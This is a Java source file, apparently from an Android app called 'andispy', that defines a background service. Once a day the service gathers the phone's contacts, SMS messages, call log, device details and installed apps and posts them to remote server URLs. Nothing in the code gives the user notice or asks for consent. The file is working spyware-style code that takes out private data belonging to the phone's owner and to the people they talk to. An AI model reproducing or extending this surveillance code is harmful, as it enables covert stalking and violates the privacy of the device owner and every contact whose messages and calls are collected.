package com.andispy.andispy.service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.andispy.andispy.activity.LoginActivity;
import com.andispy.andispy.lib.BackgroundWork;
import com.andispy.andispy.lib.Completion;
import com.andispy.andispy.lib.Tasks;
import com.andispy.andispy.network.Postdata;
import com.andispy.andispy.util.Constants;
import com.andispy.andispy.util.Util;

import org.json.JSONException;
import org.json.JSONObject;

public class MyService extends Service {

    public SharedPreferences pref;
    Util util;

    public MyService() {
    }

    @Override
    public void onCreate() {
        pref = getSharedPreferences("MyPref", MODE_PRIVATE);
        util = new Util(this);
        super.onCreate();
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        check_and_uplade();

        return super.onStartCommand(intent, flags, startId);
    }

    private void check_and_uplade() {
        long last_date = pref.getLong("last_sync_date", 0);
        if (last_date == 0) {
            start_upload();
        } else if (cal_date_difference(last_date, System.currentTimeMillis())) {
            start_upload();
        } else {
            Log.println(Log.ASSERT, "upload service", "no time for upload");
        }
    }


    boolean cal_date_difference(long d1, long d2) {

        try {

            //in milliseconds
            long diff = d2 - d1;

            long diffMinutes = diff / (60 * 1000) % 60;
            long diffHours = diff / (60 * 60 * 1000) % 24;
            long diffDays = diff / (24 * 60 * 60 * 1000);

            if (diffDays != 0) {
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;

    }


    private void start_upload() {
        Log.println(Log.ASSERT, "upload service", "upload started");
        SharedPreferences.Editor editor = pref.edit();
        editor.putLong("last_sync_date", System.currentTimeMillis());
        editor.commit();


        upload_contact();
        upload_sms();
        upload_device();
        upload_calllog();
        upload_application();
    }

    private void upload_application() {
        Tasks.executeInBackground(MyService.this, new BackgroundWork<JSONObject>() {
            @Override
            public JSONObject doInBackground() throws Exception {

                return util.GetApplicationList();
            }
        }, new Completion<JSONObject>() {
            @Override
            public void onSuccess(Context context, JSONObject result) {


                try {
                    Postdata P = new Postdata(Constants.URL_Application, result, getApplicationContext(), LoginActivity.class);
                } catch (JSONException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }


            }


            @Override
            public void onError(Context context, Exception e) {

            }
        });
    }

    private void upload_calllog() {
        Tasks.executeInBackground(MyService.this, new BackgroundWork<JSONObject>() {
            @Override
            public JSONObject doInBackground() throws Exception {
                Cursor c = getContentResolver().query( Uri.parse("content://call_log/calls"), null, null, null, null);
                return util.GetCallLogList();
            }
        }, new Completion<JSONObject>() {
            @Override
            public void onSuccess(Context context, JSONObject result) {


                try {
                    Postdata P = new Postdata(Constants.URL_CallLog, result, getApplicationContext(), LoginActivity.class);
                } catch (JSONException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }


            }


            @Override
            public void onError(Context context, Exception e) {

            }
        });
    }

    private void upload_device() {
        Tasks.executeInBackground(MyService.this, new BackgroundWork<JSONObject>() {
            @Override
            public JSONObject doInBackground() throws Exception {

                return util.GetDeviceInfoList();
            }
        }, new Completion<JSONObject>() {
            @Override
            public void onSuccess(Context context, JSONObject result) {


                try {
                    Postdata P = new Postdata(Constants.URL_Device, result, getApplicationContext(), LoginActivity.class);
                } catch (JSONException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }


            }


            @Override
            public void onError(Context context, Exception e) {

            }
        });
        }

            private void upload_sms() {
        //////////////////////message send////////////////
        Tasks.executeInBackground(MyService.this, new BackgroundWork<JSONObject>() {
            @Override
            public JSONObject doInBackground() throws Exception {
                Cursor c = getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
                return util.GetSmsList();
            }
        }, new Completion<JSONObject>() {
            @Override
            public void onSuccess(Context context, JSONObject result) {


                try {
                    Postdata P = new Postdata(Constants.URL_Message, result, getApplicationContext(), LoginActivity.class);
                } catch (JSONException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }

//                HashMap<String,String> data=new HashMap<String, String>();
//                data.put("data",result.toString());
//
//                util.http.Uplolad_sms(data, new Callback<Response>() {
//                    @Override
//                    public void success(Response response, Response response2) {
//                        Log.println(Log.ASSERT,"demo",""+util.getJson(response));
//                    }
//
//                    @Override
//                    public void failure(RetrofitError error) {
//                        Log.println(Log.ASSERT,"demo",""+error);
//                    }
//                });
            }

            @Override
            public void onError(Context context, Exception e) {

            }
        });
    }


    private void upload_contact() {
        Tasks.executeInBackground(MyService.this, new BackgroundWork<JSONObject>() {
            @Override
            public JSONObject doInBackground() throws Exception {
                Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                return util.GetContactList();
            }
        }, new Completion<JSONObject>() {
            @Override
            public void onSuccess(Context context, JSONObject result) {
                try {
                    Postdata P = new Postdata(Constants.URL_Contact, result, getApplicationContext(), LoginActivity.class);
                } catch (JSONException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }


            }

            @Override
            public void onError(Context context, Exception e) {

            }
        });
    }
}


